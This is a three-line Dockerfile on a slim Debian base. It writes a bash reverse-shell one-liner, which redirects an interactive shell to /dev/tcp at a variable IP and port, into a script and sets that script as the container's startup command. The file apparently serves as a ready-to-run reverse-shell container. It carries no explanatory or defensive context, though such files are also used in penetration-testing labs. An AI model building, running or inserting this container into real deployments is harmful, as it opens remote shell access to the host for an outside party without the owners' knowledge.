FROM debian:testing-slim

RUN echo "bash -i >& /dev/tcp/\${IP}/\${PORT} 0>&1" > rs.sh

CMD ["bash", "./rs.sh"]